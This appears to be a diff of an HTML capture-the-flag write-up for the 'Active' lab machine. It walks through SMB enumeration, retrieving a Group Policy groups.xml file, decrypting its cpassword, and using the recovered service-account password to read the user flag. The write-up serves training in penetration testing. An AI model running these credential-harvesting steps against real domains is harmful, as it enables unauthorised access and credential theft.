@@ -108,11 +108,7 @@
         
           
           
-          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
-          
-            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
-            </label>
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-hidden="true"  type="radio" name="__palette" id="__palette_1">
           
         
       </form>
@@ -556,49 +552,56 @@
 
 
 <h1 id="active">Active</h1>
+<p>This is Active Directory box, where we get to exploit a vulnerable Domain Controller.</p>
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="nmap">Nmap</h3>
-<p><div class="highlight"><pre><span></span><code>nmap -T4 -sC -sV -p- -Pn <span class="m">10</span>.10.10.100
+<p><strong>-T4</strong>: aggressive speed scan</p>
+<p><strong>-sC</strong>: use safe default scripts</p>
+<p><strong>-sV</strong>: detect service version</p>
+<p><strong>-p-</strong>: scan all ports</p>
+<p><strong>-Pn</strong>: skip host discovery
+<div class="highlight"><pre><span></span><code>nmap -T4 -sC -sV -p- -Pn <span class="m">10</span>.10.10.100
 </code></pre></div>
-Scan shows a lot of open ports.
+There are some interesting ports: 88, 135, 139, 445, 389
 <img alt="[nmap]" src="../images/active1.png" /></p>
 <h3 id="rpc">RPC</h3>
-<p><div class="highlight"><pre><span></span><code>rpcclient -U <span class="s2">&quot;&quot;</span> -N <span class="m">10</span>.10.10.100
+<p>Trying to enumerate over RPC (Remote Procedure Call), but no luck there: 
+<div class="highlight"><pre><span></span><code>rpcclient -U <span class="s2">&quot;&quot;</span> -N <span class="m">10</span>.10.10.100
 </code></pre></div>
 <div class="highlight"><pre><span></span><code>rpcclient $&gt; enumdomusers
 rpcclient $&gt; enumdomgroups
 </code></pre></div>
-Enumeration doesn't work.
 <img alt="[rpc]" src="../images/active2.png" /></p>
 <h3 id="smb">SMB</h3>
-<p>Anonymous login is allowed:
+<p>Checking if anonymous login is allowed over SMB (Server Message Block):
 <div class="highlight"><pre><span></span><code>smbclient -N -L <span class="m">10</span>.10.10.100
 smbclient -L <span class="m">10</span>.10.10.100 --no-pass
 </code></pre></div>
 <img alt="[smb]" src="../images/active3.png" />
 <div class="highlight"><pre><span></span><code>smbmap -H <span class="m">10</span>.10.10.100
 </code></pre></div>
+Only one share with read-only access:
 <img alt="[smb]" src="../images/active4.png" />
 <div class="highlight"><pre><span></span><code>smbclient -N //10.10.10.100/Replication
 </code></pre></div>
 <img alt="[smb]" src="../images/active5.png" /></p>
+<p><img alt="[smb]" src="../images/active6.png" /></p>
 <p>This directory looks interesting:
-<img alt="[smb]" src="../images/active6.png" />
 <div class="highlight"><pre><span></span><code>smb: <span class="se">\a</span>ctive.htb<span class="se">\p</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\m</span>achine<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\&gt;</span> dir
 </code></pre></div>
-Downloading groups.xml:
+Downloading <em>groups.xml</em> to host:
 <img alt="[smb]" src="../images/active7.png" /></p>
-<p>There are credentials inside:
+<p>We find credentials inside:
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
 <span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;</span><span class="nt">&gt;&lt;User</span> <span class="na">clsid=</span><span class="s">&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;</span> <span class="na">name=</span><span class="s">&quot;active.htb\SVC_TGS&quot;</span> <span class="na">image=</span><span class="s">&quot;2&quot;</span> <span class="na">changed=</span><span class="s">&quot;2018-07-18 20:46:06&quot;</span> <span class="na">uid=</span><span class="s">&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;</span><span class="nt">&gt;&lt;Properties</span> <span class="na">action=</span><span class="s">&quot;U&quot;</span> <span class="na">newName=</span><span class="s">&quot;&quot;</span> <span class="na">fullName=</span><span class="s">&quot;&quot;</span> <span class="na">description=</span><span class="s">&quot;&quot;</span> <span class="na">cpassword=</span><span class="s">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span> <span class="na">changeLogon=</span><span class="s">&quot;0&quot;</span> <span class="na">noChange=</span><span class="s">&quot;1&quot;</span> <span class="na">neverExpires=</span><span class="s">&quot;1&quot;</span> <span class="na">acctDisabled=</span><span class="s">&quot;0&quot;</span> <span class="na">userName=</span><span class="s">&quot;active.htb\SVC_TGS&quot;</span><span class="nt">/&gt;&lt;/User&gt;</span>
 <span class="nt">&lt;/Groups&gt;</span>
 </code></pre></div>
-Decrypting password from Group Policy:
+Since Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published</a> the AES private key, we can easily decrypt any <em>Group Policy Preferences</em> password:
 <div class="highlight"><pre><span></span><code>gpp-decrypt <span class="s1">&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span>
 </code></pre></div>
 <img alt="[rcp]" src="../images/active8.png" /></p>
 <h3 id="ldap">LDAP</h3>
-<p>Looks like it's Domain Controller.
+<p>Now we enumerate LDAP (Lightweight Directory Access Protocol), to get more information from <em>Active Directory</em>:
 <div class="highlight"><pre><span></span><code>nmap -sT -Pn -n --open <span class="m">10</span>.10.10.100 -p389 --script ldap-rootdse
 </code></pre></div>
 <img alt="[rcp]" src="../images/active9.png" /></p>
@@ -615,16 +618,17 @@ Decrypting password from Group Policy:
 <div class="highlight"><pre><span></span><code>smbmap -H <span class="m">10</span>.10.10.100 -u SVC_TGS -p <span class="s1">&#39;GPPstillStandingStrong2k18&#39;</span>
 </code></pre></div>
 <img alt="[rcp]" src="../images/active12.png" /></p>
-<p>Users directory looks interesting, because it's read-only and has no comments.
+<p>Users directory looks interesting, because it's read-only and has no comments:
 <div class="highlight"><pre><span></span><code>smbclient -U <span class="s2">&quot;active.htb\SVC_TGS%GPPstillStandingStrong2k18&quot;</span> //10.10.10.100/Users
 </code></pre></div>
 <img alt="[rcp]" src="../images/active13.png" /></p>
 <h4 id="flag">Flag</h4>
+<p>We find user flag here:
 <div class="highlight"><pre><span></span><code>smb: \SVC_TGS\Desktop\&gt; get user.txt
 getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 
 696f302836e481ebf6f935c
-</code></pre></div>
+</code></pre></div></p>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="kerberoasting">Kerberoasting</h3>
 <p><img alt="[rcp]" src="../images/active14.png" /></p>
